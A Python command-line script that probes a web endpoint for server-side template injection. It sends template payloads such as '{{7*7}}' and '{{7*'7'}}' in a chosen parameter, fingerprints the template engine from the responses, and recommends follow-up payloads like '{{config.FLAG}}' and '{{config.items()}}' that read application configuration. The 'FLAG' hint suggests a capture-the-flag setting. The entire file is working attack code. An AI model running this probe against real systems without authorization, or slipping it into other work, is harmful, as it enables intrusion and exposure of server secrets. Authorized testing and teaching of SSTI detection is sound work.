#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import json
import urllib.error
import urllib.parse
import urllib.request

PROBES = [
    {
        "id": "jinja_math",
        "payload": "{{7*7}}",
        "expected": ["49"],
    },
    {
        "id": "jinja_string",
        "payload": "{{7*'7'}}",
        "expected": ["7777777", "49"],
    },
    {
        "id": "dollar_math",
        "payload": "${7*7}",
        "expected": ["49"],
    },
    {
        "id": "erb_math",
        "payload": "<%= 7*7 %>",
        "expected": ["49"],
    },
]


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Probe a web target for SSTI behavior.")
    parser.add_argument("--target", required=True, help="Endpoint URL")
    parser.add_argument("--param", required=True, help="Template-controlled parameter name")
    parser.add_argument("--baseline", default="guest", help="Baseline benign value")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--show-bodies", action="store_true")
    return parser.parse_args()


def send_request(
    target: str,
    param: str,
    value: str,
    method: str,
    timeout: float,
) -> tuple[int, str]:
    encoded = urllib.parse.urlencode({param: value})
    request_url = target
    data = None

    if method == "GET":
        separator = "&" if urllib.parse.urlparse(target).query else "?"
        request_url = f"{target}{separator}{encoded}"
    else:
        data = encoded.encode("utf-8")

    request = urllib.request.Request(request_url, data=data, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="replace")


def summarize(status: int, body: str) -> dict[str, object]:
    return {
        "status": status,
        "length": len(body),
        "sha256": hashlib.sha256(body.encode("utf-8")).hexdigest()[:16],
        "preview": body[:160].replace("\n", "\\n"),
    }


def evaluate_probe(body: str, payload: str, expected_tokens: list[str]) -> dict[str, object]:
    hits = [token for token in expected_tokens if token in body]
    literal_reflection = payload in body
    return {
        "payload_reflected": literal_reflection,
        "expected_hits": hits,
        "looks_evaluated": bool(hits) and not literal_reflection,
    }


def infer_engine(probe_results: dict[str, dict[str, object]]) -> tuple[str, str]:
    jinja_math = probe_results["jinja_math"]
    jinja_string = probe_results["jinja_string"]
    dollar_math = probe_results["dollar_math"]
    erb_math = probe_results["erb_math"]

    if jinja_string["looks_evaluated"]:
        hits = set(jinja_string["expected_hits"])
        if "7777777" in hits:
            return (
                "Jinja2 is likely",
                "{{config.FLAG}}",
            )
        if "49" in hits:
            return (
                "Twig-style handling is likely",
                "{{_self}}",
            )

    if jinja_math["looks_evaluated"]:
        return (
            "Jinja2/Twig/Nunjucks-style handling is plausible",
            "{{config.items()}}",
        )

    if dollar_math["looks_evaluated"]:
        return (
            "Freemarker or EL-style handling is plausible",
            "${7*'7'}",
        )

    if erb_math["looks_evaluated"]:
        return (
            "ERB/JSP-style handling is plausible",
            "<%= 7 + 7 %>",
        )

    return (
        "No strong SSTI signal from the default probes",
        "Re-check whether the sink is only reflected HTML or client-side templating",
    )


def main() -> int:
    args = parse_args()
    baseline_status, baseline_body = send_request(
        args.target,
        args.param,
        args.baseline,
        args.method,
        args.timeout,
    )

    probe_results: dict[str, dict[str, object]] = {}
    bodies: dict[str, str] = {"baseline": baseline_body}
    output: dict[str, object] = {
        "target": args.target,
        "param": args.param,
        "baseline": summarize(baseline_status, baseline_body),
        "probes": [],
    }

    for probe in PROBES:
        status, body = send_request(
            args.target,
            args.param,
            probe["payload"],
            args.method,
            args.timeout,
        )
        analysis = evaluate_probe(body, probe["payload"], probe["expected"])
        probe_results[probe["id"]] = analysis
        bodies[probe["id"]] = body
        output["probes"].append(
            {
                "id": probe["id"],
                "payload": probe["payload"],
                "summary": summarize(status, body),
                "analysis": analysis,
            }
        )

    likely_engine, next_probe = infer_engine(probe_results)
    output["likely_engine"] = likely_engine
    output["recommended_next_probe"] = next_probe

    print(json.dumps(output, ensure_ascii=False, indent=2))

    if args.show_bodies:
        print("\n[baseline body]\n")
        print(bodies["baseline"])
        for probe in PROBES:
            print(f"\n[{probe['id']} body]\n")
            print(bodies[probe["id"]])

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
